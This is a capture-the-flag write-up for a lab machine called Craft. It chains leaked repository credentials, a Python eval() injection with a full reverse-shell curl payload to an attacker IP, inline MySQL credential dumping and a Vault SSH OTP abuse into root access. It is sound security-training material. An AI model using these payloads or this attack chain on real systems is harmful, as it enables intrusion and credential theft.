Summary
#

Craft is a medium-difficulty Linux machine that demonstrates how exposed source code, insecure coding practices, and poor secret management can be chained to achieve full system compromise. The attack begins by enumerating a public Gogs repository, where commit history reveals hardcoded credentials and a vulnerable use of Python’s eval() on user-controlled input, leading to remote code execution inside a Docker container. From the container, database credentials are leveraged to recover additional user credentials, granting access to a private repository containing an encrypted SSH key. Finally, misconfigured HashiCorp Vault SSH OTP authentication is abused to generate a one-time password for the root account, resulting in complete privilege escalation.

Initial Access
#

Application Enumeration
#

Inspecting the HTTPS application on port 443 reveals a static “About” page. The navigation elements point to two external subdomains: api.craft.htb and gogs.craft.htb. To interact with these virtual hosts, we update our local /etc/hosts file:

└─$ sudo nano /etc/hosts

10.129.11.193 craft.htb api.craft.htb gogs.craft.htb

Before we moved to the subdomains, we fuzzed the current site for hidden directories with ffuf but nothing useful was found:

└─$ ffuf -u 'https://10.129.11.193/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404

The api.craft.htb website shows a swagger API with various API endpoints

The gogs.craft.htb website shows a self-hosted Git services application namely Gogs.

We start enumerating the public repositories in the Gogs instance as the Sign In page doesn’t allow to register a new account. Looking in the Explore tab, there is a public repository named craft-api. After enumerating all the files in the repository thoroughly, we find credentials of a user Dinesh in a commit history for a file test.py. Using the credentials, we can login to the Gogs as that user.

Exploiting the eval() Vulnerability
#

After login, reviewing the other commits for a file brew.py reveals the introduction of a critical vulnerability.

The user input from the abv parameter is passed directly into a dangerous eval() function to verify if the value is a decimal below 1.0. Since user-controlled input is evaluated as Python code, this results in a Remote Code Execution (RCE) vulnerability via the POST /api/brew/ endpoint in the api subdomain.

We can authenticate and get a token via the “GET /auth/login” API endpoint. With the POST /bew/ endpoint, we can send a request to create an entry for a new brew and then copy the POST request structure after we have sended the initial POST request. The request will eventually fail because we have not set the authentication token in the header and the Swagger UI does not provide a way to include the required authentication header in the request.

After adding the required authentication header to the request locally, we can use curl to send it without Using the following curl command, we can obtain a reverse shell using python payload exploiting the eval function:

└─$ curl -X POST "https://api.craft.htb/api/brew/" \
  -H "accept: application/json" \
  -H "Content-Type: application/json" \
  -H "X-Craft-API-Token: <API-TOKEN>" \
  -d '{"id":100,"brewer":"test","name":"test","style":"Dark","abv":"2"}' \
  --insecure

In the response, we get an error that the value of abv must be less than 1. So this tells that the vulnerable code is still present in the website’s source code file and we can exploit it to get a reverse shell. We will use python payload in the abv parameter’s value which will send us a reverse shell after it gets executed by the eval() function:

└─$ curl -X POST "https://api.craft.htb/api/brew/" \
  -H "accept: application/json" \
  -H "Content-Type: application/json" \
  -H "X-Craft-API-Token: <API-TOKEN>" \
  -d '{"id":100,"brewer":"test","name":"test","style":"Dark","abv":"0 or exec(\"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\\"<ATTACKER-IP>\\\",9090)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\") or 0"}' \
  --insecure

Make sure to start the netcat listener first before executing the above payload request:

└─$ netcat -lvnp 9090

Looking back in the netcat listener, we get a shell as root user.

Post-Exploitation Enumeration
#

After checking the hostname and the .dockerenv in the / directory, we find that we are in a docker container and the api website is running from this container. There is not much to enumerate in the container except the API website’s application files that we can read now.

In the current directory, the dbtest.py script is retrieving credentials of MySQL from a settings.py file in the craft_api directory and executing a hardcoded SQL query. We can run it with “python3 dbtest.py” and it outputs the query results which shows that the docker container can interact with the MySQL database. Using the credentials, we can enumerate what other databases and tables are present in the MySQL.

We can’t use nano reliably in the reverse shell connection to edit the dbtest.py file to change the SQL query for performing the database enumeration. For this reason, we utilize Python inline scripts to manually enumerate the database. First of all, to query all the databases, we can use command:

python -c "import pymysql; conn=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=conn.cursor(); cur.execute('SHOW DATABASES'); print(cur.fetchall()); conn.close()"

The query returns two databases: craft and information_schema. Since information_schema is a standard MySQL system database, we continue enumerating the craft database.

python -c "import pymysql; conn=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=conn.cursor(); cur.execute('SHOW TABLES'); print(cur.fetchall()); conn.close()"

The output shows “brew” & “user” tables are present. To describe the schema of user table and see what columns it contain:

python -c "import pymysql; conn=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=conn.cursor(); cur.execute('DESCRIBE user'); print(cur.fetchall()); conn.close()"

The output reveals 3 columns as “id”, “username” and “password” are present. We will dump the content of the latter 2 columns in order to get credentials if there is any:

python -c "import pymysql; conn=pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft'); cur=conn.cursor(); cur.execute('SELECT username,password FROM user'); print(cur.fetchall()); conn.close()"

The query shows credentials for the 3 users from the Gogs website as:

(('dinesh', '4aUh0A8PbVJxgd'), ('ebachman', 'llJ77D8QFkLPQB'), ('gilfoyle', 'ZEU3N8WNM2rh4T'))

We already have the credentials of dinesh so we can try the other two. For SSH access on port 22 and 6022, the credentials of all 3 users failed but on the Gogs website, credentials of “gilfoyle” worked successfully and we find a private repository “craft-infra”.

The repo has a .ssh folder containing public and private key pairs. We can copy the private key in order to authenticate as that user on the SSH service:

└─$ chmod 600 id_rsa

└─$ ssh -i id_rsa gilfoyle@10.129.11.193

Authenticating with the key asks for a password because the key is encrypted. Trying the Gogs login creds of gilfoyle worked and we successfully log in to the target machine.

The flag user.txt is present in the home directory of gilfoyle.

Escalating Privileges
#

Vault Enumeration
#

In the hidden files in Gilfoyle’s home directory, we find a vault-token file containing some token string. Enumerating the system we find an environment variable “VAULT_ADDR=https://vault.craft.htb:8200/”.

The output of linpeas.sh script also flags the hidden token file with heading “Vault-SSH”. Searcing for the keyword we find that Vault-SSH is a secrets engine of a SSH managing application from HashiCorp Vault. Researching the application further reveals that:

HashiCorp Vault’s SSH secrets engine replaces long-lived SSH keys with short-lived credentials. Depending on the configuration, it can issue either signed SSH certificates or one-time passwords (OTPs) for authentication.

Looking at the configuration setups in the documentation revealed that it can either be setup to authenticate users via SSH key signed certificates or OTP.

Abusing Vault SSH OTP
#

The current configuration of the system to see whether it allows SSH signed certificates or OTP can be viewed using:

gilfoyle@craft:~$ vault list ssh/roles

Keys
----
root_otp

From here it seems like OTP is configured which we can further see details as:

gilfoyle@craft:~$ vault read ssh/roles/root_otp

Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22

In the above configuration output, the default_user that users can authenticate as is set to root. To request the OTP as root for the current system IP:

gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.129.11.193

Key                Value
---                -----
lease_id           ssh/creds/root_otp/e9930e51-4fdc-53d7-85e8-b02e4a2e1daf
lease_duration     768h
lease_renewable    false
ip                 10.129.11.193
key                625ffde7-e21a-fc1b-9c44-e4c588795064
key_type           otp
port               22
username           root

The OTP is given as the value of “key” parameter which we can use to authenticate as root when doing SSH login in place of password. To do so, we can escalate to root from the current user shell via:

gilfoyle@craft:~$ ssh root@localhost

When it asks for the password, provide the key and it will login as root user successfully.

The root.txt can be found in the root directory of root user.
